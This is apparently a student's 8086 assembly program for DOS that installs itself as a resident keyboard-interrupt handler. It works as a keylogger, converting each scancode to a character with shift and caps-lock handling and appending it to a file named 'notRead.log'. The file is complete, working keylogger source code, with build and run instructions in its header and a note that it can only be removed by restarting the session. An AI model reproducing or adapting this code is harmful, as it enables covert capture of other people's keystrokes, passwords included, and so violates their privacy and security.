;AUTORES: Fabrizio Signorello, Delfina Borrelli, Loureyro Aldana y Pugliese Valentin.

;-------------------------------------------------------------------------------------------------
; Programa que se instala en la interrupcion 09h del teclado y funciona como un KeyLogger, "copia" la letra ingresada
; y la imrpime en el archivo llamado "notRead.log" (tiene que estar previamente creado)
; se genera el .com con los siguientes comandos:
;   -tasm catch.asm
;   -tlink /t catch.obj
; Y luego se ejcuta con el comando:
;   -catch
; La unica forma de desactivar el programa es cerrando la sesion de la Vm y volviendola a abrir
;------------------------------------------------------------------------------------------------

.8086
.model tiny  ;Necesito Tiny para generar el .com
.code
    org 100h
inicio:
    jmp main ;empiezo por la instalacion
    nop

;-----------------------------------------------------------------------------------------------
; Cuerpo de la Interrupcion que captura una tecla y la imprime por pantalla
;-----------------------------------------------------------------------------------------------

imprimir proc FAR
;   Cuido el entorno
    Sti
    push ax
    push cx
    push bx
    push dx
    push si
    push DS ;Guardo el Data Segment

    mov ax, CS ;fundamental para que el programa encuentre las variables en el "data segment"
    mov ds,ax

;   limpio los registro que voy a usar
    mov ax,0    ;al va a guardar el scancode capturado y el Ascii que voy a imprimir
    mov bx,0    ;bl va a ser mi flag de caps lock
    mov si,0    ;si va a ser mi flag de shift

;comparo si hay Caps Lock
caps_lock:
    mov ah,02h  ;voy a utilizar la funcion 02 de la int 16, que me permite ver si el shift y el caps lock estan apretados
    int 16h
    mov bl, 40h ;preparo la mascara ya que me interesa ver unicamnete el bit 6 (el del caps lock)
    and al,bl   ; hago un and, si me da todo 0 significa que no hay ningun bit encendido
    cmp al, 0
    jne caps_pressed
    jmp shifteo

caps_pressed:
    mov bl,1    ;si el bit 6 estaba encendido pongo en 1 a bl, en este caso actua como flag

;comparo si hay shift apretado
shifteo:
    mov ah,02h
    int 16h     
    mov cl, 3h  ;vuelvo a usar la misma funcion, pero en este caso armo la mascara para el Right Shift y Left Shift
    and al,cl
    cmp al, 0
    jne shift_pressed
    jmp ingreso ; si no esta apretado salto directo al ingreso del caracter

shift_pressed:
    mov si,1  ;este registro actua como flag y me marca si el shift esta siendo apretado
    cmp bl,1  ; me fijo si el flag de mayusculas (bl) ya estaba encendido
    je desactivo
    mov bl,1   ;sino lo esataba lo enciendo para escribir en mayuscula
    jmp ingreso

desactivo:
    mov bl,0   ;si ya estaba en mayuscula cuando apriete shift voy a querer escribir en minusculas
    jmp ingreso


ingreso:
   mov ax,0   ;limpio ax
   in ax,60h  ;copio el scancode a AL
   NOP				; Agrego NOPs para esperar la operaci�n de IN de E/S
   NOP
   NOP
   NOP
   NOP
   NOP
   NOP
   NOP

; Comparo el scancode con los numeros de 0-9
comparoNumeros:
    cmp si,1    ; me fijo si el shift esta apretado, de estarlo no voy a escribir numeros
    je auxiliarSalto
    cmp ax,02h
    je esUno
    cmp ax,03h
    je esDos
    cmp ax,04h
    je esTres
    cmp ax,05h
    je esCuatro
    cmp ax,06h
    je esCinco
    cmp ax,07h
    je esSeis
    cmp ax,08h
    je esSiete
    cmp ax,09h
    je esOcho
    cmp ax,0Ah
    je esNueve
    cmp ax,0Bh
    je esCero
auxiliarSalto:  ;agrego una etiqueta auxiliar por el limite de bytes en los saltos
    jmp comparoLetras

;Muevo el ASCII correspondiente a AL para  luego poder imprimirlo 
esUno:
    mov al,31h
    jmp numero
esDos:
    mov al,32h
    jmp numero
esTres:
    mov al,33h
    jmp numero
esCuatro:
    mov al,34h
    jmp numero
esCinco:
    mov al,35h
    jmp numero
esSeis:
    mov al,36h
    jmp numero
esSiete:
    mov al,37h
    jmp numero
esOcho:
    mov al,38h
    jmp numero
esNueve:
    mov al,39h
    jmp numero
esCero:
    mov al,30h
    jmp numero

;imprimo el numero
 numero:
    mov palabra,AL  ;muevo el ASCII a convertir a una variable para no perderlo
    clc             ;pongo el carry flag en 0 por las dudas

    mov al, 2       ;paso parametro leer archivo (leer y escribir)
    lea dx, nombre  ;paso el offset con el nombre del archivo
    mov ah,3Dh      ;llamo a leer archivo
    int 21h
    jc errorAbrir   ; me fijo si hubo un error al abrirlo
    mov bx, ax      ;guardo el filehandler en bx

    ; Posiciono el handler al final del archivo, para hacer "append", codigo extraido de https://stackoverflow.com/questions/27285839/assembly-8086-append-at-the-end-of-file
    mov ah, 42h  ; "lseek"
    mov al, 2    ; position relative to end of file
    mov cx, 0    ; offset MSW
    mov dx, 0    ; offset LSW
    int 21h

;   escribo en el archivo
    mov ah,40h      ;llamo a la funcion 40 ( la de escribir)
    mov cx,1        ;pongo la cantidad de bytes a escribir
    lea dx, palabra ;paso el offset donde esta el nombre del archivo
    int 21h         ; el handler ya esta en bx
    jc errorEscribir

;   cierro el archivo
    mov ah,3eh
    int 21h
    jc errorCerrar
    jmp salirNumero

;control de errores
errorAbrir:
    mov ah,9
    mov dx, offset error1
    int 21h
    jmp salirNumero

errorEscribir:
    mov ah,9
    mov dx, offset error2
    int 21h
    jmp salirNumero

errorCerrar:
    mov ah,9
    mov dx, offset error2
    int 21h
    jmp salirNumero


;salgo a la int 09h vieja y retorno el entorno
salirNumero:
    pop ds
    pop si
    pop dx
    pop bx
    pop cx
    pop ax
    jmp CS:ViejaInt09

;Comparo si es una letra
comparoLetras:
    cmp ax,10h
    je esQ
    cmp ax,11h
    je esW
    cmp ax,12h
    je esE
    cmp ax,13h
    je esR
    cmp ax,14h
    je esT
    cmp ax,15h
    je esY
    cmp ax,16h
    je esU
    cmp ax,17h
    je esIs
    cmp ax,18h
    je esO
    cmp ax,19h
    je esPe
    jmp comparoLetras2

;Muevo el ASCII correspondiente a AL para  luego poder imprimirlo 
esQ:
    mov al,71h
    jmp caracter
esW:
    mov al,77h
    jmp caracter
esE:
    mov al,65h
    jmp caracter
esR:
    mov al,72h
    jmp caracter
esT:
    mov al,74h
    jmp caracter
esY:
    mov al,79h
    jmp caracter
esU:
    mov al,75h
    jmp caracter
esIs:
    mov al,69h
    jmp caracter
esO:
    mov al,6Fh
    jmp caracter
esPe:
    mov al,70h
    jmp caracter

;tengo que seapara por el limite de bytes en los saltos
comparoLetras2:
    cmp ax,1Eh
    je esA
    cmp ax,1Fh
    je esS
    cmp ax,20h
    je esD
    cmp ax,1Ch
    je esEnter
    cmp ax,39h
    je esEspacio
    jmp comparoLetras3


;Muevo el ASCII correspondiente a AL para  luego poder imprimirlo
esA:
    mov al,61h
    jmp caracter
esS:
    mov al,73h
    jmp caracter
esD:
    mov al,64h
    jmp caracter
esEnter:
    mov al,0DH
    jmp imprimoCaracter
esEspacio:
    mov al,20h
    jmp imprimoCaracter

;tengo que seapara por el limite de bytes en los saltos
comparoLetras3:
    cmp ax,21h
    je esF
    cmp ax,22h
    je esG
    cmp ax,23h
    je esH
    cmp ax,24h
    je esJ
    cmp ax,25h
    je esK
    cmp ax,26h
    je esL

    cmp ax,2Ch
    je esZ
    cmp ax,2Dh
    je esX
    cmp ax,2Eh
    je esCe
    cmp ax,2Fh
    je esV
    cmp ax,30h
    je esB
    cmp ax,31h
    je esN
    cmp ax,32h
    je esM
    jmp comparoEspecial1

;Muevo el ASCII correspondiente a AL para  luego poder imprimirlo 
esB:
    mov al,62h
    jmp caracter
esCe:
    mov al,63h
    jmp caracter

esF:
    mov al,66h
    jmp caracter
esG:
    mov al,67h
    jmp caracter
esH:
    mov al,68h
    jmp caracter

esJ:
    mov al,6Ah
    jmp caracter
esK:
    mov al,6Bh
    jmp caracter
esL:
    mov al,6Ch
    jmp caracter
esM:
    mov al,6Dh
    jmp caracter
esN:
    mov al,6Eh
    jmp caracter
esV:
    mov al,76h
    jmp caracter
esX:
    mov al,78h
    jmp caracter
esZ:
    mov al,7Ah
    jmp caracter
    
;si es un caracter de la a-z lo imprimo, sino lo dejo pasar  
 caracter:   
    cmp bl,1    ; me fijo si el flag de mayusculas esta encendido
    je  resto
    jmp imprimoCaracter
resto:
    sub al,20h  ; si esta enendido le resto 20h al caracter para convertirlo a masyuscula
imprimoCaracter:
    mov palabra,AL  ;guardo el ASCII en una varialbe para no perderlo
    clc             ;pongo el carry flag en 0 por las dudas

    mov al, 2       ;paso parametro leer archivo (leer y escribir)
    lea dx, nombre  ;paso el nombre del archivo
    mov ah,3Dh      ;llamo a leer archivo
    int 21h
    mov bx, ax ;guardo el filehandler

    ; Posiciono el handler al final del archivo, para hacer "append", codigo extraido de https://stackoverflow.com/questions/27285839/assembly-8086-append-at-the-end-of-file
    mov ah, 42h  ; "lseek"
    mov al, 2    ; position relative to end of file
    mov cx, 0    ; offset MSW
    mov dx, 0    ; offset LSW
    int 21h

;   escribir
    mov ah,40h  ;llamo a la funcion 40
  ;muevo el filehandler
    mov cx,1   ;pongo la cantidad de bytes a escribir
    lea dx, palabra
    int 21h

;   cierro el archivo
    mov ah,3eh
    int 21h
    jmp salir

;desapilo y salgo a la Int 09h original
salir:
    pop ds
    pop si
    pop dx
    pop bx
    pop cx
    pop ax
    jmp CS:ViejaInt09


; Algunos caracteres especiales del teclado
comparoEspecial1:
    cmp ax,27h
    je esEnie
    cmp ax, 35h
    je esGuion

    cmp si,1    ;reviso si el shift esta encendido
    je comparoEspecial2
    
    cmp ax, 33h
    je esComa
    cmp ax, 34h
    je esPunto
    jmp salir

esEnie:
    mov al,10100100b
    jmp imprimoCaracter
esComa:
    mov al, 2Ch
    jmp imprimoCaracter
esPunto:
    mov al, 2Eh
    jmp imprimoCaracter
esGuion:
    mov al, 2Dh
    jmp imprimoCaracter

; Algunos caracteres que se imprimen solo cuando el shift esta apretado
comparoEspecial2:
    cmp ax,02h
    je esExclamacion
    cmp ax,03h
    je esQuote
    cmp ax,05h
    je esPeso
    cmp ax,06h
    je esPorcentaje
    cmp ax,07h
    je esAmpersant
    cmp ax,08h
    je esBarra
    cmp ax,09h
    je esParentesis1
    cmp ax,0Ah
    je esParentesis2
    cmp ax,0Bh
    je esIgual
    cmp ax, 33h
    je esPuntoComa
    cmp ax, 34h
    je esDosPuntos
    jmp salir

esExclamacion:
    mov al,21h
    jmp imprimoCaracter
esQuote:
    mov al,22h
    jmp imprimoCaracter
esPeso:
    mov al,24h
    jmp imprimoCaracter
esPorcentaje:
    mov al,25h
    jmp imprimoCaracter
esAmpersant:
    mov al,26h
    jmp imprimoCaracter
esBarra:
    mov al,2Fh
    jmp imprimoCaracter
esParentesis1:
    mov al,28h
    jmp imprimoCaracter
esParentesis2:
    mov al,29h
    jmp imprimoCaracter
esIgual:
    mov al,3Dh
    jmp imprimoCaracter
esPuntoComa:
    mov al,3Bh
    jmp imprimoCaracter
esDosPuntos:
    mov al,3Ah
    jmp imprimoCaracter
endp
;-----------------------------------------------------------------------------------------------
; variables a usar en la ISR propia
;-----------------------------------------------------------------------------------------------
nombre db "notRead.log",0     ;en esta varaible se guarda el nombre del archivo donde va a ir el keylogger
error1 label byte
db "error al abrir al archivo",24h
error2 label byte
db "error al escribir el archivo",24h
error3 label byte
db "error al cerrar el archivo",24h
palabra db 0                ;en esta variable se gaurda el ScanCode de la tecla presionada

ViejaInt09 LABEL DWORD
DespIntXX   dw 0
SegIntXX    dw 0
GuardoTecla db 0
FinResidente LABEL BYTE	
;-----------------------------------------------------------------------------------------------
; variables a usar en el instalador
;-----------------------------------------------------------------------------------------------
msg           db 0dh, 0ah, "Programa instalado correctamente",0ah,0dh,24h
salto         db 0ah,0dh,24h

main:

;   Junto todos los segmentos
    mov ax, CS
    mov DS, ax
    mov ES, ax

InstalarInt:
    mov AX,3509h        ; Obtiene la ISR que esta instalada en la interrupcion
    int 21h   
         
    mov DespIntXX,BX    
    mov SegIntXX,ES

    mov AX,2509h	; Coloca la nueva ISR en el vector de interrupciones
    mov DX,Offset imprimir 
    int 21h

DejarResidente:		
    Mov     AX,(15+offset FinResidente) 
    Shr     AX,1            
    Shr     AX,1        ;Se obtiene la cantidad de paragraphs
    Shr     AX,1
    Shr     AX,1	;ocupado por el codigo
    Mov     DX,AX           
    Mov     AX,3100h    ;y termina sin error 0, dejando el
    Int     21h         ;programa residente
end inicio
